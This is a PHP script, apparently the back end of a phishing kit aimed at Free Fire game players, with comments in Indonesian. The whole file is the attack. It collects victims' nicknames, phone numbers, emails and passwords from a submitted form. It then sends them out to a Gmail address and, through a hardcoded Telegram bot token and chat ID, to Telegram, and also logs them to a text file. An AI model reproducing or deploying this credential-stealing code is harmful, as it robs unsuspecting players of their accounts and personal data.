<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $level = $_POST['level'];
    $nickname = $_POST['nickname'];
    $phone = $_POST['phone'];
    $email = $_POST['email'];
    $password = $_POST['password'];
    $login_type = $_POST['login_type'];

    // Format pesan
    $message = "🔹 Data Baru 🔹\n";
    $message .= "📌 Login via: $login_type\n";
    $message .= "🎮 Level: $level\n";
    $message .= "🆔 Nickname: $nickname\n";
    $message .= "📞 No HP: $phone\n";
    $message .= "📧 Email: $email\n";
    $message .= "🔑 Password: $password\n";
    $message .= "==============================\n";

    // Kirim ke Email
    $to = "seogacor7@gmail.com";  // Ganti dengan email tujuan
    $subject = "[ RESULT FREEF1RE ]";
    $headers = "From: RESULT@FREEF1RE.ID\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    mail($to, $subject, $message, $headers);

    // Kirim ke Telegram
    $telegramToken = "7773405849:AAHmMn5p_askXNat7Se9NPOkwaI5juYvDdU";  // Ganti dengan token bot
    $telegramChatID = "1397785777";  // Ganti dengan ID chat
    $telegramURL = "https://api.telegram.org/bot$telegramToken/sendMessage";
    $telegramData = ['chat_id' => $telegramChatID, 'text' => $message];

    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded",
            'method' => 'POST',
            'content' => http_build_query($telegramData)
        ]
    ];
    $context = stream_context_create($options);
    file_get_contents($telegramURL, false, $context);

    // Simpan ke file GJKASHD.txt
    $file = "GJKASHD.txt";
    file_put_contents($file, $message, FILE_APPEND);
}
?>
